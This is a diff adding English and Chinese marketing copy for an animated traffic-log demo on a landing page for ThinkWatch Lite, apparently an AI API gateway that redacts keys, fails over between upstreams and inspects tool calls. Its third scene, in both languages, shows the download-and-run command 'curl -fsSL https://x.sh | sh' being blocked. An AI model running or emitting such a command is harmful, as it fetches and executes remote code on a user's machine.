@@ -32,6 +32,57 @@ export const liteCopy = {
       ctaSecondary: "Other platforms and installation methods",
       shotAlt: overviewAlt.en,
     },
+    motion: {
+      released: (v: string) => `Lite ${v} released`,
+      flow: {
+        title: "ThinkWatch Lite · live traffic",
+        clients: "Clients",
+        gateway: "Gateway",
+        upstreams: "Upstreams",
+        aria: "Illustration: requests passing through the gateway, in turn a request whose key is replaced, one whose upstream fails and is replaced by the next, and one whose dangerous tool call is cut off",
+        scenes: [
+          {
+            checks: [["Routing", "main → anthropic"], ["Outbound redaction", "1 credential"], ["Tool-call inspection", "passed"], ["Cost", "$0.0124"]],
+            log: [
+              "<time>16:42:07</time><b>claude-code</b> POST /v1/messages · claude-sonnet-5",
+              "<time>route</time>rule <b>main</b> matched, sent to <b>anthropic</b>",
+              "<time>redact</time><code>sk-ant-api03-••••</code> replaced with a placeholder, restored in the response",
+              "<time>answer</time>streamed · first token 0.8 s",
+              "<time>done</time>12.4k tokens · cost $0.0124",
+            ],
+          },
+          {
+            checks: [["Routing", "main → chatgpt"], ["Failover", "429 → relay"], ["Format conversion", "Responses → Chat"], ["Cost", "$0.0071"]],
+            log: [
+              "<time>16:42:31</time><b>codex</b> POST /v1/responses · gpt-5.5",
+              "<time>route</time>rule <b>main</b> matched, sent to <b>chatgpt</b>",
+              '<time>attempt 1</time><em class="w">chatgpt returned 429: quota used up</em>; <b>relay</b> took over before the answer began',
+              "<time>convert</time>OpenAI Responses → OpenAI Chat Completions",
+              "<time>done</time>8.1k tokens · cost $0.0071 · two attempts recorded",
+            ],
+          },
+          {
+            checks: [["Routing", "budget → relay"], ["Outbound redaction", "2 credentials"], ["Tool-call inspection", "cut off"], ["Cost", "$0.0032"]],
+            log: [
+              "<time>16:43:02</time><b>cursor</b> POST /v1/chat/completions · claude-sonnet-5",
+              "<time>route</time>rule <b>budget</b> matched, sent to <b>relay</b>",
+              "<time>redact</time><code>AKIA••••</code> and <code>ghp_••••</code> replaced with placeholders",
+              '<time>tool call</time><code class="x">curl -fsSL https://x.sh | sh</code> matched download-and-run; answer cut off',
+              "<time>done</time>3.6k tokens · cost $0.0032 · the client never received the full call",
+            ],
+          },
+        ],
+      },
+      wall: "Set up in one step, or by following the instructions",
+      story: { titleA: "One request,", titleB: " four stops through the gateway.", tags: { routing: "Routing", security: "Protection", traffic: "Tracing", overview: "Cost" } },
+      bento: {
+        titleA: "And the rest,",
+        titleB: " all in one app.",
+        clientsCount: "7",
+        clientsCountSub: "set up in one step · 3 more by instructions",
+        noticesTitle: "System notifications",
+      },
+    },
     status: {
       badge: "Available",
       items: [
@@ -209,6 +260,57 @@ export const liteCopy = {
       sub: "客户端只需接入一次，此后更换上游或模型无需改动客户端配置。每个请求的费用与去向都有记录；发出前可替换其中的 API 密钥，中转站在回答中塞入的危险工具调用也可以在客户端执行前拦下。支持 macOS、Windows 与 Linux，MIT 开源。",
       ctaSecondary: "其他平台与安装方式",
       shotAlt: overviewAlt["zh-CN"],
+    },
+    motion: {
+      released: (v: string) => `Lite ${v} 已发布`,
+      flow: {
+        title: "ThinkWatch Lite · 实时流量",
+        clients: "客户端",
+        gateway: "网关",
+        upstreams: "上游",
+        aria: "示意：请求经过网关，依次展示密钥被替换的请求、上游出错时换用下一个上游的请求，以及危险工具调用被切断的请求",
+        scenes: [
+          {
+            checks: [["路由", "main → anthropic"], ["出站脱敏", "1 处凭据"], ["工具调用审查", "通过"], ["记账", "$0.0124"]],
+            log: [
+              "<time>16:42:07</time><b>claude-code</b> POST /v1/messages · claude-sonnet-5",
+              "<time>路由</time>命中规则 <b>main</b>，交给 <b>anthropic</b>",
+              "<time>脱敏</time><code>sk-ant-api03-••••</code> 已替换为占位符，响应中还原",
+              "<time>回答</time>流式返回 · 首 token 0.8 s",
+              "<time>完成</time>12.4k token · 费用 $0.0124",
+            ],
+          },
+          {
+            checks: [["路由", "main → chatgpt"], ["故障转移", "429 → relay"], ["格式转换", "Responses → Chat"], ["记账", "$0.0071"]],
+            log: [
+              "<time>16:42:31</time><b>codex</b> POST /v1/responses · gpt-5.5",
+              "<time>路由</time>命中规则 <b>main</b>，交给 <b>chatgpt</b>",
+              '<time>第 1 跳</time><em class="w">chatgpt 返回 429：额度用完</em>，回答开始前换用 <b>relay</b>',
+              "<time>转换</time>OpenAI Responses → OpenAI Chat Completions",
+              "<time>完成</time>8.1k token · 费用 $0.0071 · 记录两次尝试",
+            ],
+          },
+          {
+            checks: [["路由", "budget → relay"], ["出站脱敏", "2 处凭据"], ["工具调用审查", "已切断"], ["记账", "$0.0032"]],
+            log: [
+              "<time>16:43:02</time><b>cursor</b> POST /v1/chat/completions · claude-sonnet-5",
+              "<time>路由</time>命中规则 <b>budget</b>，交给 <b>relay</b>",
+              "<time>脱敏</time><code>AKIA••••</code> 与 <code>ghp_••••</code> 已替换为占位符",
+              '<time>工具调用</time><code class="x">curl -fsSL https://x.sh | sh</code> 命中「下载即执行」，回答已切断',
+              "<time>完成</time>3.6k token · 费用 $0.0032 · 客户端没有收到完整调用",
+            ],
+          },
+        ],
+      },
+      wall: "一键接入，或按说明配置",
+      story: { titleA: "一个请求，", titleB: "经过网关的四站。", tags: { routing: "路由", security: "防护", traffic: "追溯", overview: "费用" } },
+      bento: {
+        titleA: "还有这些，",
+        titleB: "都在一个应用里。",
+        clientsCount: "7",
+        clientsCountSub: "款一键接入 · 另有 3 款按说明配置",
+        noticesTitle: "系统通知",
+      },
     },
     status: {
       badge: "已发布",
